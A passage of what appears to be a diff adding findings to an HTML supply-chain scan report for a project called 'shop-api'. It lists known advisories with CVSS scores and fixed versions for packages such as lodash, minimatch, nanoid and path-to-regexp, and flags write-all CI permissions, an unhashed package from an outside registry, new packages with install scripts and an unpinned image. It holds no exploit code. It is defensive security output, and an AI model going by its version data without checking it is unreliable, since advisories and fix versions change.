+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-2883-xcg3-v3hh: js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.2 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Command Injection in lodash</summary>
+<p class="meta">GRD-e21d6bab29 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-35jh-r3h4-6jhm" target="_blank">GHSA-35jh-r3h4-6jhm</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-35jh-r3h4-6jhm: Command Injection in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &lt;4.17.21</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.17.21 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash</summary>
+<p class="meta">GRD-844e5ccc16 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-p6mc-m468-83gw" target="_blank">GHSA-p6mc-m468-83gw</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-p6mc-m468-83gw: Prototype Pollution in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=3.7.0 &lt;4.17.19</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.17.19 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names</summary>
+<p class="meta">GRD-ad2936893a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-r5fr-rjxr-66jc" target="_blank">GHSA-r5fr-rjxr-66jc</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-r5fr-rjxr-66jc: lodash vulnerable to Code Injection via `_.template` imports key names</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;=4.17.23</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.18.0 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch ReDoS vulnerability</summary>
+<p class="meta">GRD-c10ccf2b40 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-f8q6-p94x-37v3" target="_blank">GHSA-f8q6-p94x-37v3</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-f8q6-p94x-37v3: minimatch ReDoS vulnerability</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.0.5</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.0.5 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions</summary>
+<p class="meta">GRD-7a9576dd66 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-23c5-xmqv-rm74" target="_blank">GHSA-23c5-xmqv-rm74</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-23c5-xmqv-rm74: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.4</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.1.4 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments</summary>
+<p class="meta">GRD-58616691cd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj" target="_blank">GHSA-7r86-cg39-jmmj</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-7r86-cg39-jmmj: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimatch@3.0.4: minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern</summary>
+<p class="meta">GRD-1bb0a68bcd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-3ppc-4f35-3m26" target="_blank">GHSA-3ppc-4f35-3m26</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; minimatch@3.0.4</li><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; glob@7.1.6 &rarr; minimatch@3.0.4</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-3ppc-4f35-3m26: minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimatch]</span> installed minimatch@3.0.4 is inside affected range &lt;3.1.3</li></ul><p><b>Fix info:</b> fixed in: 3.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>minimatch@3.0.4<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: Integer Overflow or Wraparound</summary>
+<p class="meta">GRD-89215d2ced · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w" target="_blank">GHSA-xwg4-73v4-xw9w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xwg4-73v4-xw9w: nanoid: Integer Overflow or Wraparound</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.12</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.3.12 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: custom generators can loop indefinitely when size is zero</summary>
+<p class="meta">GRD-edf2c05b8a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-2v37-7h3g-55p8" target="_blank">GHSA-2v37-7h3g-55p8</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-2v37-7h3g-55p8: nanoid: custom generators can loop indefinitely when size is zero</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.18</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.3.18 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: nanoid: non-secure generators can loop indefinitely with negative size</summary>
+<p class="meta">GRD-28e4ff8f49 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-28wg-ghj8-5hjv" target="_blank">GHSA-28wg-ghj8-5hjv</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-28wg-ghj8-5hjv: nanoid: non-secure generators can loop indefinitely with negative size</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.16</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 3.3.16 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in node-fetch@2.6.0: node-fetch forwards secure headers to untrusted sites</summary>
+<p class="meta">GRD-575e3b161a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-r683-j2x4-v87g" target="_blank">GHSA-r683-j2x4-v87g</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; node-fetch@2.6.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-r683-j2x4-v87g: node-fetch forwards secure headers to untrusted sites</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/node-fetch]</span> installed node-fetch@2.6.0 is inside affected range &lt;2.6.7</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.8 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 2.6.7 · introduced via: node-fetch@2.6.0</p></details></td>
+<td>node-fetch@2.6.0<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS</summary>
+<p class="meta">GRD-1c5fa4dd94 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-rhx6-c78j-4q9w" target="_blank">GHSA-rhx6-c78j-4q9w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-rhx6-c78j-4q9w: path-to-regexp contains a ReDoS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.12</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.12 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions</summary>
+<p class="meta">GRD-e29370793e · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-9wv6-86v2-598j" target="_blank">GHSA-9wv6-86v2-598j</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-9wv6-86v2-598j: path-to-regexp outputs backtracking regular expressions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.10</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.10 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters</summary>
+<p class="meta">GRD-1f7ff0a614 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-37ch-88jc-xwx2" target="_blank">GHSA-37ch-88jc-xwx2</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; path-to-regexp@0.1.7</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-37ch-88jc-xwx2: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/path-to-regexp]</span> installed path-to-regexp@0.1.7 is inside affected range &lt;0.1.13</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.1.13 · introduced via: express@4.17.1</p></details></td>
+<td>path-to-regexp@0.1.7<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution</summary>
+<p class="meta">GRD-c83abdd646 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-hrpp-h998-j3pp" target="_blank">GHSA-hrpp-h998-j3pp</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-hrpp-h998-j3pp: qs vulnerable to Prototype Pollution</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;6.7.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 6.7.3 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()</summary>
+<p class="meta">GRD-66c66a37b9 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-5c6j-r48x-rmvq" target="_blank">GHSA-5c6j-r48x-rmvq</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-5c6j-r48x-rmvq: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &lt;=7.0.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 7.0.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="cicd">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>cicd</td><td><details><summary>Workflow grants write-all token permissions</summary>
+<p class="meta">GRD-ad6c4933dc · rule CICD-BROAD-PERMISSIONS · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:9]</span> permissions: write-all</li></ul></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="medium" data-cat="integrity">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>integrity</td><td><details><summary>debug-helper-utils@1.0.2 has no integrity hash in the lockfile</summary>
+<p class="meta">GRD-5e99ff3e09 · rule INTEGRITY-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> integrity field missing</li></ul></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="integrity">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>integrity</td><td><details><summary>debug-helper-utils@1.0.2 resolved from outside the npm registry (npm.corp-artifacts.net)</summary>
+<p class="meta">GRD-a8cedcd7ed · rule INTEGRITY-UNTRUSTED-SOURCE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> resolved: https://npm.corp-artifacts.net/debug-helper-utils/-/debug-helper-utils-1.0.2.tgz</li></ul></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>New direct dependency: crossenv@6.1.1</summary>
+<p class="meta">GRD-1387eece0e · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> crossenv not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> added crossenv@6.1.1</li><li><b>install-script</b> <span class="src">[lockfile]</span> new package runs install-time scripts</li></ul><p><b>Fix info:</b> introduced via: crossenv@6.1.1</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>New direct dependency: debug-helper-utils@1.0.2</summary>
+<p class="meta">GRD-4b17ae29e8 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> debug-helper-utils not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> added debug-helper-utils@1.0.2</li><li><b>install-script</b> <span class="src">[lockfile]</span> new package runs install-time scripts</li></ul><p><b>Fix info:</b> introduced via: debug-helper-utils@1.0.2</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>unexpected-dependency</td><td><details><summary>ua-parser-js@0.7.29 is in the lockfile but nothing depends on it</summary>
+<p class="meta">GRD-4932c67577 · rule UNEXPECTED-ORPHAN · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> no dependency edge leads to this package</li></ul><p><b>Fix info:</b> remove (npm prune) unless intentionally vendored; check who added it</p></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="untrusted-image">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;node&#x27; uses a mutable tag (latest)</summary>
+<p class="meta">GRD-3c26c523d8 · rule IMAGE-MUTABLE-TAG · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:1]</span> image: node:latest</li></ul><p><b>Fix info:</b> pin to a version tag and digest, e.g. node:&lt;version&gt;@sha256:&lt;digest&gt;</p></details></td>
+<td>node@latest<br><small>direct build</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in express@4.17.1: Express.js Open Redirect in malformed URLs</summary>
+<p class="meta">GRD-0bd24c48d9 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-rv95-896h-c2vc" target="_blank">GHSA-rv95-896h-c2vc</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-rv95-896h-c2vc: Express.js Open Redirect in malformed URLs</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/express]</span> installed express@4.17.1 is inside affected range &lt;4.19.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 4.19.2 · introduced via: express@4.17.1</p></details></td>
+<td>express@4.17.1<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases</summary>
+<p class="meta">GRD-b003d43ebf · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-h67p-54hq-rp68" target="_blank">GHSA-h67p-54hq-rp68</a></p>
